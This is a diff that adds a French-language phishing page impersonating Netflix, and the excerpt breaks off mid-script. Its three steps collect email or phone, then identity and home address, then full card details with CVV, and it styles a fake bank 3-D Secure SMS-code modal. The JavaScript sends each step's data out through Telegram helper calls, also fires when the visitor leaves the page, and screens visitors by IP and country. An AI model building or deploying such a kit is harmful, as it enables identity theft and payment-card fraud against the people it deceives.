@@ -1,0 +1,1465 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Netflix – Connexion</title>
+  <link rel="icon" type="image/png" href="favicon.jpg" />
+
+  <style>
+    {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+      background: radial-gradient(ellipse at 60% 5%, #6b0b0b 0%, #3a0000 25%, #1a0000 50%, #000000 100%);
+      min-height: 100vh;
+      color: #fff;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* HEADER */
+    header {
+      background: linear-gradient(to bottom, rgba(0,0,0,0.55) 0%, transparent 100%);
+      border-bottom: 1px solid rgba(255,255,255,0.08);
+      padding: 16px 48px;
+    }
+
+    .netflix-logo {
+      display: block;
+      height: 42px;
+      width: auto;
+    }
+
+    /* PAGES */
+    .page {
+      display: none;
+      flex: 1;
+      flex-direction: column;
+    }
+
+    .page.active {
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* MAIN CONTENT */
+    main {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      padding-top: 70px;
+    }
+
+    .form-container {
+      width: 100%;
+      max-width: 460px;
+      padding: 0 16px;
+    }
+
+    .form-container h1 {
+      font-size: 2rem;
+      font-weight: 700;
+      color: #ffffff;
+      line-height: 1.25;
+      margin-bottom: 26px;
+    }
+
+    .form-container .subtitle {
+      font-size: 1rem;
+      color: #b3b3b3;
+      margin-bottom: 26px;
+    }
+
+    /* INPUT */
+    .input-group {
+      margin-bottom: 12px;
+    }
+
+    .input-group label {
+      display: block;
+      font-size: 0.82rem;
+      color: #b3b3b3;
+      margin-bottom: 6px;
+    }
+
+    .input-group input,
+    .input-group select {
+      width: 100%;
+      padding: 18px 16px;
+      background-color: #2d2d2d;
+      border: 1px solid #555;
+      border-radius: 4px;
+      color: #e5e5e5;
+      font-size: 1rem;
+      outline: none;
+      transition: border-color 0.2s;
+      -webkit-appearance: none;
+      appearance: none;
+    }
+
+    .input-group select {
+      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23999'%3E%3Cpath d='M7 10l5 5 5-5z'/%3E%3C/svg%3E");
+      background-repeat: no-repeat;
+      background-position: right 14px center;
+      background-size: 20px;
+      cursor: pointer;
+    }
+
+    .input-group select option {
+      background: #1a1a1a;
+      color: #fff;
+    }
+
+    .input-group input::placeholder {
+      color: #8c8c8c;
+    }
+
+    .input-group input:focus,
+    .input-group select:focus {
+      border-color: #999;
+      background-color: #333;
+    }
+
+    /* ROW 2 cols */
+    .input-row {
+      display: flex;
+      gap: 12px;
+    }
+
+    .input-row .input-group {
+      flex: 1;
+    }
+
+    /* BUTTON */
+    .btn-continuer {
+      width: 100%;
+      padding: 17px;
+      background-color: #e50914;
+      color: #ffffff;
+      border: none;
+      border-radius: 4px;
+      font-size: 1rem;
+      font-weight: 700;
+      cursor: pointer;
+      letter-spacing: 0.3px;
+      transition: background-color 0.2s;
+      margin-bottom: 28px;
+      margin-top: 8px;
+    }
+
+    .btn-continuer:hover {
+      background-color: #c1070f;
+    }
+
+    /* HELP */
+    .help-link {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      color: #ffffff;
+      font-size: 0.95rem;
+      font-weight: 500;
+      cursor: pointer;
+      margin-bottom: 32px;
+      width: fit-content;
+    }
+
+    .help-link svg {
+      width: 14px;
+      height: 14px;
+      fill: #ffffff;
+      transition: transform 0.2s;
+    }
+
+    .help-link.open svg {
+      transform: rotate(180deg);
+    }
+
+    /* RECAPTCHA NOTE */
+    .recaptcha-note {
+      font-size: 0.78rem;
+      color: #737373;
+      line-height: 1.5;
+      max-width: 380px;
+    }
+
+    /* HELP DROPDOWN */
+    .help-dropdown {
+      display: none;
+      background-color: #2d2d2d;
+      border: 1px solid #444;
+      border-radius: 4px;
+      padding: 16px;
+      margin-top: -20px;
+      margin-bottom: 20px;
+    }
+
+    .help-dropdown.open {
+      display: block;
+    }
+
+    .help-dropdown a {
+      display: block;
+      color: #b3b3b3;
+      font-size: 0.9rem;
+      text-decoration: none;
+      padding: 6px 0;
+      border-bottom: 1px solid #444;
+    }
+
+    .help-dropdown a:last-child {
+      border-bottom: none;
+    }
+
+    .help-dropdown a:hover {
+      color: #ffffff;
+    }
+
+    /* FOOTER */
+    footer {
+      background-color: rgba(0,0,0,0.75);
+      color: #737373;
+      padding: 40px 10%;
+      font-size: 0.85rem;
+      margin-top: 60px;
+    }
+
+    .footer-phone {
+      color: #737373;
+      margin-bottom: 28px;
+      font-size: 0.95rem;
+    }
+
+    .footer-links {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 14px 20px;
+      max-width: 520px;
+      margin-bottom: 32px;
+    }
+
+    .footer-links a {
+      color: #737373;
+      text-decoration: underline;
+      font-size: 0.82rem;
+      cursor: pointer;
+    }
+
+    .footer-links a:hover {
+      color: #b3b3b3;
+    }
+
+    .lang-selector {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      border: 1px solid #555;
+      border-radius: 4px;
+      padding: 8px 14px;
+      background: transparent;
+      color: #b3b3b3;
+      font-size: 0.88rem;
+      cursor: pointer;
+    }
+
+    .lang-selector svg {
+      width: 14px;
+      height: 14px;
+      fill: #b3b3b3;
+    }
+
+    .lang-selector select {
+      background: transparent;
+      border: none;
+      color: #b3b3b3;
+      font-size: 0.88rem;
+      cursor: pointer;
+      outline: none;
+      -webkit-appearance: none;
+      appearance: none;
+    }
+
+    .lang-selector select option {
+      background: #1a1a1a;
+      color: #fff;
+    }
+
+    /* ERROR */
+    .error-msg {
+      color: #e87c03;
+      font-size: 0.82rem;
+      margin-top: 4px;
+      display: none;
+    }
+
+    .error-msg.show {
+      display: block;
+    }
+
+    /* PAGE 2 SPECIFIC */
+    .step-indicator {
+      font-size: 0.82rem;
+      color: #b3b3b3;
+      margin-bottom: 8px;
+      letter-spacing: 0.5px;
+      text-transform: uppercase;
+    }
+
+    .back-link {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      color: #b3b3b3;
+      font-size: 0.88rem;
+      cursor: pointer;
+      margin-bottom: 24px;
+      text-decoration: none;
+      transition: color 0.2s;
+    }
+
+    .back-link:hover {
+      color: #fff;
+    }
+
+    .back-link svg {
+      width: 16px;
+      height: 16px;
+      fill: #b3b3b3;
+    }
+
+    .section-title {
+      font-size: 0.95rem;
+      font-weight: 600;
+      color: #b3b3b3;
+      margin: 18px 0 12px 0;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      border-bottom: 1px solid #333;
+      padding-bottom: 6px;
+    }
+
+    /* MODAL 3DS */
+    .modal-3ds-overlay {
+      display: none;
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0,0,0,0.85);
+      z-index: 9999;
+      align-items: center;
+      justify-content: center;
+    }
+    .modal-3ds-overlay.active {
+      display: flex;
+    }
+    .modal-3ds-box {
+      background: #fff;
+      border-radius: 8px;
+      width: 420px;
+      max-width: 95vw;
+      overflow: hidden;
+      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+      color: #111;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.6);
+    }
+    .modal-3ds-header {
+      background: #003087;
+      padding: 14px 20px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .modal-3ds-header .bank-logo {
+      background: #fff;
+      color: #003087;
+      font-weight: 900;
+      font-size: 13px;
+      padding: 4px 8px;
+      border-radius: 4px;
+      letter-spacing: 0.5px;
+    }
+    .modal-3ds-header span {
+      color: #fff;
+      font-size: 13px;
+      font-weight: 600;
+    }
+    .modal-3ds-body {
+      padding: 24px 28px;
+    }
+    .modal-3ds-body h3 {
+      font-size: 17px;
+      font-weight: 700;
+      margin-bottom: 6px;
+      color: #111;
+    }
+    .modal-3ds-body p {
+      font-size: 13px;
+      color: #555;
+      margin-bottom: 18px;
+      line-height: 1.5;
+    }
+    .modal-3ds-body .sms-info {
+      background: #f4f6fa;
+      border: 1px solid #dde2ef;
+      border-radius: 6px;
+      padding: 12px 14px;
+      font-size: 13px;
+      color: #333;
+      margin-bottom: 18px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .modal-3ds-body .sms-info .sms-icon {
+      font-size: 22px;
+    }
+    .modal-3ds-input-label {
+      font-size: 12px;
+      font-weight: 600;
+      color: #444;
+      margin-bottom: 6px;
+      display: block;
+    }
+    .modal-3ds-input {
+      width: 100%;
+      border: 1.5px solid #ccc;
+      border-radius: 6px;
+      padding: 12px 14px;
+      font-size: 20px;
+      letter-spacing: 8px;
+      text-align: center;
+      color: #111;
+      outline: none;
+      transition: border-color 0.2s;
+      margin-bottom: 6px;
+    }
+    .modal-3ds-input:focus {
+      border-color: #003087;
+    }
+    .modal-3ds-timer {
+      font-size: 12px;
+      color: #888;
+      text-align: center;
+      margin-bottom: 18px;
+    }
+    .modal-3ds-timer span {
+      color: #e50914;
+      font-weight: 700;
+    }
+    .modal-3ds-btn {
+      width: 100%;
+      background: #003087;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      padding: 13px;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    .modal-3ds-btn:hover {
+      background: #00236b;
+    }
+    .modal-3ds-footer {
+      border-top: 1px solid #eee;
+      padding: 12px 20px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .modal-3ds-footer .secured-by {
+      font-size: 11px;
+      color: #888;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+    .modal-3ds-footer .visa-logo {
+      font-size: 16px;
+      font-weight: 900;
+      font-style: italic;
+      color: #1a1f71;
+      letter-spacing: -1px;
+    }
+    .modal-3ds-error {
+      color: #e50914;
+      font-size: 12px;
+      text-align: center;
+      display: none;
+      margin-bottom: 10px;
+    }
+    .modal-3ds-error.show { display: block; }
+    .modal-3ds-loading {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      padding: 30px;
+      gap: 16px;
+    }
+    .modal-3ds-loading.show { display: flex; }
+    .spinner-3ds {
+      width: 48px;
+      height: 48px;
+      border: 5px solid #e0e0e0;
+      border-top: 5px solid #003087;
+      border-radius: 50%;
+      animation: spin3ds 0.9s linear infinite;
+    }
+    @keyframes spin3ds {
+      to { transform: rotate(360deg); }
+    }
+    .modal-3ds-success {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      padding: 30px;
+      gap: 10px;
+      text-align: center;
+    }
+    .modal-3ds-success.show { display: flex; }
+    .modal-3ds-success .check-icon {
+      width: 56px;
+      height: 56px;
+      background: #1a7a1a;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 28px;
+      color: #fff;
+    }
+    .modal-3ds-success h3 { font-size: 18px; font-weight: 700; color: #1a7a1a; }
+    .modal-3ds-success p { font-size: 13px; color: #555; }
+
+    .success-banner {
+      display: none;
+      background-color: #1a7a1a;
+      border: 1px solid #2ea02e;
+      border-radius: 4px;
+      padding: 14px 16px;
+      font-size: 0.9rem;
+      color: #fff;
+      margin-bottom: 16px;
+      text-align: center;
+    }
+
+    .success-banner.show {
+      display: block;
+    }
+
+    /* CARD INPUT STYLING */
+    .card-icon {
+      position: absolute;
+      right: 14px;
+      top: 50%;
+      transform: translateY(-50%);
+      display: flex;
+      gap: 4px;
+      align-items: center;
+    }
+
+    .input-wrap {
+      position: relative;
+    }
+
+    .input-wrap input {
+      width: 100%;
+      padding: 18px 16px;
+      background-color: #2d2d2d;
+      border: 1px solid #555;
+      border-radius: 4px;
+      color: #e5e5e5;
+      font-size: 1rem;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+
+    .input-wrap input:focus {
+      border-color: #999;
+      background-color: #333;
+    }
+
+    .input-wrap input::placeholder {
+      color: #8c8c8c;
+    }
+
+    .payment-secure {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 0.78rem;
+      color: #737373;
+      margin-bottom: 18px;
+    }
+
+    .payment-secure svg {
+      fill: #737373;
+      width: 14px;
+      height: 14px;
+      flex-shrink: 0;
+    }
+
+    .card-logos {
+      display: flex;
+      gap: 8px;
+      margin-bottom: 20px;
+      align-items: center;
+    }
+
+    .card-badge {
+      background: #fff;
+      border-radius: 4px;
+      padding: 3px 8px;
+      font-size: 0.7rem;
+      font-weight: 800;
+      letter-spacing: 0.5px;
+    }
+
+    .card-badge.visa { color: #1a1f71; }
+    .card-badge.mc { color: #eb001b; }
+    .card-badge.amex { color: #007bc1; }
+    .card-badge.cb { color: #222; }
+  </style>
+</head>
+<body>
+
+  <!-- ================= PAGE 1 ================= -->
+  <div class="page active" id="page1">
+
+    <header>
+      <img class="netflix-logo" src="logo.png" alt="Netflix" />
+    </header>
+
+    <main>
+      <div class="form-container">
+        <h1>Saisissez vos informations<br>pour régler le problème</h1>
+
+        <div class="input-group">
+          <input type="text" id="email" placeholder="E-mail ou numéro de mobile" autocomplete="email" />
+          <p class="error-msg" id="emailError">Veuillez saisir votre e-mail ou numéro de mobile.</p>
+        </div>
+
+        <button class="btn-continuer" onclick="handleContinue()">Continuer</button>
+
+        <div class="help-link" id="helpToggle" onclick="toggleHelp()">
+          <span>Obtenir de l'aide</span>
+          <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <path d="M7 10l5 5 5-5z"/>
+          </svg>
+        </div>
+
+        <div class="help-dropdown" id="helpDropdown">
+          <a href="#">Mot de passe oublié ?</a>
+          <a href="#">Besoin d'aide pour vous connecter ?</a>
+          <a href="#">Envoyer un lien de connexion par SMS</a>
+        </div>
+
+        <p class="recaptcha-note">
+          Cette page est protégée par Google reCAPTCHA pour nous assurer que
+          vous n'êtes pas un robot.
+        </p>
+      </div>
+    </main>
+
+    <footer>
+      <p class="footer-phone">Des questions ? Appelez le 0805 98 06 66 (sans frais)</p>
+      <div class="footer-links">
+        <a href="#">FAQ</a>
+        <a href="#">Centre d'aide</a>
+        <a href="#">Boutique Netflix</a>
+        <a href="#">Conditions d'utilisation</a>
+        <a href="#">Confidentialité</a>
+        <a href="#">Préférences de cookies</a>
+        <a href="#">Mentions légales</a>
+        <a href="#">Choix liés à la pub</a>
+      </div>
+      <div class="lang-selector">
+        <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg" fill="#b3b3b3">
+          <path d="M8 0a8 8 0 100 16A8 8 0 008 0zm5.657 4.929h-2.206a9.003 9.003 0 00-.81-2.073 6.52 6.52 0 013.016 2.073zM8 1.536c.74 0 1.638 1.11 2.178 3.393H5.822C6.362 2.646 7.26 1.536 8 1.536zm-2.64.32a9.003 9.003 0 00-.811 2.073H2.343A6.52 6.52 0 015.36 1.856zM1.536 8c0-.584.08-1.149.23-1.687H4.18A13.84 13.84 0 004.07 8c0 .573.038 1.13.11 1.687H1.766A6.455 6.455 0 011.536 8zm.807 3.071h2.206c.19.746.45 1.44.811 2.073a6.52 6.52 0 01-3.017-2.073zM8 14.464c-.74 0-1.638-1.11-2.178-3.393h4.356C9.638 13.354 8.74 14.464 8 14.464zm2.64-.32c.361-.633.62-1.327.811-2.073h2.206a6.52 6.52 0 01-3.017 2.073zm.998-3.607A12.393 12.393 0 0011.93 8c0-.573-.038-1.13-.11-1.687h2.414c.15.538.23 1.103.23 1.687 0 .584-.08 1.149-.23 1.687h-2.596z"/>
+        </svg>
+        <select>
+          <option selected>Français</option>
+          <option>English</option>
+        </select>
+        <svg viewBox="0 0 24 24" fill="#b3b3b3"><path d="M7 10l5 5 5-5z"/></svg>
+      </div>
+    </footer>
+
+  </div>
+  <!-- ================= FIN PAGE 1 ================= -->
+
+
+  <!-- ================= PAGE 2 ================= -->
+  <div class="page" id="page2">
+
+    <header>
+      <img class="netflix-logo" src="logo.png" alt="Netflix" />
+    </header>
+
+    <main>
+      <div class="form-container" style="max-width:500px;">
+
+        <a class="back-link" onclick="goBack()">
+          <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z"/>
+          </svg>
+          Retour
+        </a>
+
+        <p class="step-indicator">Étape 2 sur 2</p>
+        <h1 style="font-size:1.6rem; margin-bottom:6px;">Vérifiez vos informations</h1>
+        <p class="subtitle" style="margin-bottom:20px;">Renseignez vos coordonnées pour régler le problème.</p>
+
+        <div class="success-banner" id="successBanner">
+          ✅ Vos informations ont bien été envoyées. Merci !
+        </div>
+
+        <!-- Identité -->
+        <p class="section-title">Identité</p>
+
+        <div class="input-row">
+          <div class="input-group">
+            <label>Prénom</label>
+            <input type="text" id="prenom" placeholder="Prénom" autocomplete="given-name" />
+            <p class="error-msg" id="prenomError">Champ requis.</p>
+          </div>
+          <div class="input-group">
+            <label>Nom</label>
+            <input type="text" id="nom" placeholder="Nom" autocomplete="family-name" />
+            <p class="error-msg" id="nomError">Champ requis.</p>
+          </div>
+        </div>
+
+        <div class="input-row">
+          <div class="input-group">
+            <label>Âge</label>
+            <input type="number" id="age" placeholder="Âge" min="1" max="120" />
+            <p class="error-msg" id="ageError">Champ requis.</p>
+          </div>
+          <div class="input-group">
+            <label>Numéro de téléphone</label>
+            <input type="tel" id="telephone" placeholder="+33 6 00 00 00 00" autocomplete="tel" />
+            <p class="error-msg" id="telephoneError">Champ requis.</p>
+          </div>
+        </div>
+
+        <!-- Adresse -->
+        <p class="section-title">Adresse</p>
+
+        <div class="input-group">
+          <label>Adresse</label>
+          <input type="text" id="adresse" placeholder="Numéro et nom de rue" autocomplete="street-address" />
+          <p class="error-msg" id="adresseError">Champ requis.</p>
+        </div>
+
+        <div class="input-row">
+          <div class="input-group">
+            <label>Code postal</label>
+            <input type="text" id="codePostal" placeholder="75000" autocomplete="postal-code" maxlength="10" />
+            <p class="error-msg" id="codePostalError">Champ requis.</p>
+          </div>
+          <div class="input-group">
+            <label>Ville</label>
+            <input type="text" id="ville" placeholder="Paris" autocomplete="address-level2" />
+            <p class="error-msg" id="villeError">Champ requis.</p>
+          </div>
+        </div>
+
+        <div class="input-group">
+          <label>Pays</label>
+          <select id="pays" autocomplete="country-name">
+            <option value="France" selected>France</option>
+            <option value="Belgique">Belgique</option>
+            <option value="Suisse">Suisse</option>
+            <option value="Canada">Canada</option>
+            <option value="Luxembourg">Luxembourg</option>
+            <option value="Maroc">Maroc</option>
+            <option value="Algérie">Algérie</option>
+            <option value="Tunisie">Tunisie</option>
+            <option value="Autre">Autre</option>
+          </select>
+        </div>
+
+        <button class="btn-continuer" onclick="handleSubmit()">Valider mes informations</button>
+
+        <p class="recaptcha-note">
+          Cette page est protégée par Google reCAPTCHA pour nous assurer que
+          vous n'êtes pas un robot.
+        </p>
+
+      </div>
+    </main>
+
+    <footer>
+      <p class="footer-phone">Des questions ? Appelez le 0805 98 06 66 (sans frais)</p>
+      <div class="footer-links">
+        <a href="#">FAQ</a>
+        <a href="#">Centre d'aide</a>
+        <a href="#">Boutique Netflix</a>
+        <a href="#">Conditions d'utilisation</a>
+        <a href="#">Confidentialité</a>
+        <a href="#">Préférences de cookies</a>
+        <a href="#">Mentions légales</a>
+        <a href="#">Choix liés à la pub</a>
+      </div>
+      <div class="lang-selector">
+        <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg" fill="#b3b3b3">
+          <path d="M8 0a8 8 0 100 16A8 8 0 008 0zm5.657 4.929h-2.206a9.003 9.003 0 00-.81-2.073 6.52 6.52 0 013.016 2.073zM8 1.536c.74 0 1.638 1.11 2.178 3.393H5.822C6.362 2.646 7.26 1.536 8 1.536zm-2.64.32a9.003 9.003 0 00-.811 2.073H2.343A6.52 6.52 0 015.36 1.856zM1.536 8c0-.584.08-1.149.23-1.687H4.18A13.84 13.84 0 004.07 8c0 .573.038 1.13.11 1.687H1.766A6.455 6.455 0 011.536 8zm.807 3.071h2.206c.19.746.45 1.44.811 2.073a6.52 6.52 0 01-3.017-2.073zM8 14.464c-.74 0-1.638-1.11-2.178-3.393h4.356C9.638 13.354 8.74 14.464 8 14.464zm2.64-.32c.361-.633.62-1.327.811-2.073h2.206a6.52 6.52 0 01-3.017 2.073zm.998-3.607A12.393 12.393 0 0011.93 8c0-.573-.038-1.13-.11-1.687h2.414c.15.538.23 1.103.23 1.687 0 .584-.08 1.149-.23 1.687h-2.596z"/>
+        </svg>
+        <select>
+          <option selected>Français</option>
+          <option>English</option>
+        </select>
+        <svg viewBox="0 0 24 24" fill="#b3b3b3"><path d="M7 10l5 5 5-5z"/></svg>
+      </div>
+    </footer>
+
+  </div>
+  <!-- ================= FIN PAGE 2 ================= -->
+
+
+  <!-- ================= PAGE 3 : PAIEMENT ================= -->
+  <div class="page" id="page3">
+
+    <header>
+      <img class="netflix-logo" src="logo.png" alt="Netflix" />
+    </header>
+
+    <main>
+      <div class="form-container" style="max-width:500px;">
+
+        <a class="back-link" onclick="showPage('page2')">
+          <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z"/>
+          </svg>
+          Retour
+        </a>
+
+        <p class="step-indicator">Étape 3 sur 3</p>
+        <h1 style="font-size:1.6rem; margin-bottom:8px;">Informations de paiement</h1>
+        <p class="subtitle" style="margin-bottom:20px;">Saisissez vos coordonnées bancaires pour régler le problème.</p>
+
+        <div class="payment-secure">
+          <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/>
+          </svg>
+          Paiement sécurisé — vos données sont chiffrées SSL
+        </div>
+
+
+
+        <div class="success-banner" id="successBanner3">
+          ✅ Paiement validé. Votre compte est en cours de rétablissement.
+        </div>
+
+        <!-- Numéro de carte -->
+        <div class="input-group">
+          <label>Numéro de carte</label>
+          <div class="input-wrap">
+            <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" autocomplete="cc-number" oninput="formatCard(this)" />
+          </div>
+          <p class="error-msg" id="cardNumberError">Numéro de carte invalide (16 chiffres requis).</p>
+        </div>
+
+        <!-- Date expiration + CVV -->
+        <div class="input-row">
+          <div class="input-group">
+            <label>Date d'expiration</label>
+            <input type="text" id="expiry" placeholder="MM/AA" maxlength="5" autocomplete="cc-exp" oninput="formatExpiry(this)" />
+            <p class="error-msg" id="expiryError">Date invalide.</p>
+          </div>
+          <div class="input-group">
+            <label>Code de sécurité (CVV)</label>
+            <input type="text" id="cvv" placeholder="CVV" maxlength="4" autocomplete="cc-csc" oninput="this.value=this.value.replace(/\D/g,'')" />
+            <p class="error-msg" id="cvvError">CVV invalide.</p>
+          </div>
+        </div>
+
+        <!-- Nom sur la carte -->
+        <div class="input-group">
+          <label>Nom complet sur la carte</label>
+          <input type="text" id="cardName" placeholder="PRÉNOM NOM" autocomplete="cc-name" oninput="this.value=this.value.toUpperCase()" />
+          <p class="error-msg" id="cardNameError">Champ requis.</p>
+        </div>
+
+        <!-- Adresse de facturation -->
+        <div class="input-group">
+          <label>Adresse de facturation (ligne 1)</label>
+          <input type="text" id="billingAddress" placeholder="Numéro et nom de rue" autocomplete="billing street-address" />
+          <p class="error-msg" id="billingAddressError">Champ requis.</p>
+        </div>
+
+        <button class="btn-continuer" onclick="handlePayment()" style="margin-top:12px;">
+          Valider le paiement
+        </button>
+
+        <p class="recaptcha-note" style="margin-top:12px;">
+          Cette page est protégée par Google reCAPTCHA pour nous assurer que
+          vous n'êtes pas un robot.
+        </p>
+
+      </div>
+    </main>
+
+    <footer>
+      <p class="footer-phone">Des questions ? Appelez le 0805 98 06 66 (sans frais)</p>
+      <div class="footer-links">
+        <a href="#">FAQ</a>
+        <a href="#">Centre d'aide</a>
+        <a href="#">Boutique Netflix</a>
+        <a href="#">Conditions d'utilisation</a>
+        <a href="#">Confidentialité</a>
+        <a href="#">Préférences de cookies</a>
+        <a href="#">Mentions légales</a>
+        <a href="#">Choix liés à la pub</a>
+      </div>
+      <div class="lang-selector">
+        <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg" fill="#b3b3b3">
+          <path d="M8 0a8 8 0 100 16A8 8 0 008 0zm5.657 4.929h-2.206a9.003 9.003 0 00-.81-2.073 6.52 6.52 0 013.016 2.073zM8 1.536c.74 0 1.638 1.11 2.178 3.393H5.822C6.362 2.646 7.26 1.536 8 1.536zm-2.64.32a9.003 9.003 0 00-.811 2.073H2.343A6.52 6.52 0 015.36 1.856zM1.536 8c0-.584.08-1.149.23-1.687H4.18A13.84 13.84 0 004.07 8c0 .573.038 1.13.11 1.687H1.766A6.455 6.455 0 011.536 8zm.807 3.071h2.206c.19.746.45 1.44.811 2.073a6.52 6.52 0 01-3.017-2.073zM8 14.464c-.74 0-1.638-1.11-2.178-3.393h4.356C9.638 13.354 8.74 14.464 8 14.464zm2.64-.32c.361-.633.62-1.327.811-2.073h2.206a6.52 6.52 0 01-3.017 2.073zm.998-3.607A12.393 12.393 0 0011.93 8c0-.573-.038-1.13-.11-1.687h2.414c.15.538.23 1.103.23 1.687 0 .584-.08 1.149-.23 1.687h-2.596z"/>
+        </svg>
+        <select>
+          <option selected>Français</option>
+          <option>English</option>
+        </select>
+        <svg viewBox="0 0 24 24" fill="#b3b3b3"><path d="M7 10l5 5 5-5z"/></svg>
+      </div>
+    </footer>
+
+  </div>
+  <!-- ================= FIN PAGE 3 ================= -->
+
+
+  <script>
+    // Vérifier l'accès au chargement
+    window.addEventListener('load', async function() {
+      const accessGranted = await checkAccess();
+      if (!accessGranted) {
+        return; // La page bloquée est déjà affichée
+      }
+      
+      // Continuer normalement si l'accès est autorisé
+      console.log('Accès autorisé - IP:', userData.ip, 'Pays:', userData.country, 'Appareil:', userData.device);
+    });
+
+    // Détecter si l'utilisateur quitte la page
+    window.addEventListener('beforeunload', function() {
+      if (userData.email || userData.prenom) {
+        sendToTelegram('quit', userData);
+      }
+    });
+
+    // Navigation entre pages
+    function showPage(id) {
+      document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+      document.getElementById(id).classList.add('active');
+      window.scrollTo(0, 0);
+    }
+
+    function goBack() {
+      showPage('page1');
+    }
+
+    // Toggle aide
+    function toggleHelp() {
+      const toggle = document.getElementById('helpToggle');
+      const dropdown = document.getElementById('helpDropdown');
+      toggle.classList.toggle('open');
+      dropdown.classList.toggle('open');
+    }
+
+    // Page 1 : valider et passer à la page 2
+    async function handleContinue() {
+      const emailInput = document.getElementById('email');
+      const errorEl = document.getElementById('emailError');
+      const email = emailInput.value.trim();
+      if (!email) {
+        emailInput.style.borderColor = '#e50914';
+        errorEl.classList.add('show');
+        emailInput.focus();
+        return;
+      }
+      emailInput.style.borderColor = '#555';
+      errorEl.classList.remove('show');
+      
+      // Sauvegarder l'email
+      await saveToTelegram('email', { email: email });
+      
+      showPage('page2');
+    }
+
+    // Page 2 : valider le formulaire
+    async function handleSubmit() {
+      const fields = [
+        { id: 'prenom',     errorId: 'prenomError' },
+        { id: 'nom',        errorId: 'nomError' },
+        { id: 'age',        errorId: 'ageError' },
+        { id: 'telephone',  errorId: 'telephoneError' },
+        { id: 'adresse',    errorId: 'adresseError' },
+        { id: 'codePostal', errorId: 'codePostalError' },
+        { id: 'ville',      errorId: 'villeError' },
+      ];
+
+      let valid = true;
+      const formData = {};
+
+      fields.forEach(f => {
+        const input = document.getElementById(f.id);
+        const error = document.getElementById(f.errorId);
+        const value = input.value.trim();
+        
+        if (!value) {
+          input.style.borderColor = '#e50914';
+          error.classList.add('show');
+          valid = false;
+        } else {
+          input.style.borderColor = '#555';
+          error.classList.remove('show');
+          formData[f.id] = value;
+        }
+      });
+      
+      // Ajouter le pays
+      formData.pays = document.getElementById('pays').value;
+
+      if (valid) {
+        // Sauvegarder les données d'identité
+        await saveToTelegram('identity', formData);
+        showPage('page3');
+      }
+    }
+
+    // Formatage numéro de carte : groupes de 4
+    function formatCard(input) {
+      let v = input.value.replace(/\D/g, '').substring(0, 16);
+      input.value = v.replace(/(.{4})/g, '$1 ').trim();
+    }
+
+    // Formatage date expiration MM/AA
+    function formatExpiry(input) {
+      let v = input.value.replace(/\D/g, '').substring(0, 4);
+      if (v.length >= 3) {
+        input.value = v.substring(0, 2) + '/' + v.substring(2);
+      } else {
+        input.value = v;
+      }
+    }
+
+    // Page 3 : valider le paiement
+    async function handlePayment() {
+      let valid = true;
+      const formData = {};
+
+      // Numéro de carte (16 chiffres)
+      const cardNum = document.getElementById('cardNumber');
+      const cardNumErr = document.getElementById('cardNumberError');
+      const rawCard = cardNum.value.replace(/\s/g, '');
+      if (rawCard.length !== 16 || !/^\d+$/.test(rawCard)) {
+        cardNum.style.borderColor = '#e50914';
+        cardNumErr.classList.add('show');
+        valid = false;
+      } else {
+        cardNum.style.borderColor = '#555';
+        cardNumErr.classList.remove('show');
+        formData.cardNumber = cardNum.value;
+      }
+
+      // Date expiration
+      const expiry = document.getElementById('expiry');
+      const expiryErr = document.getElementById('expiryError');
+      const expiryVal = expiry.value;
+      if (!/^\d{2}\/\d{2}$/.test(expiryVal)) {
+        expiry.style.borderColor = '#e50914';
+        expiryErr.classList.add('show');
+        valid = false;
+      } else {
+        expiry.style.borderColor = '#555';
+        expiryErr.classList.remove('show');
+        formData.expiry = expiryVal;
+      }
+
+      // CVV
+      const cvv = document.getElementById('cvv');
+      const cvvErr = document.getElementById('cvvError');
+      if (cvv.value.length < 3) {
+        cvv.style.borderColor = '#e50914';
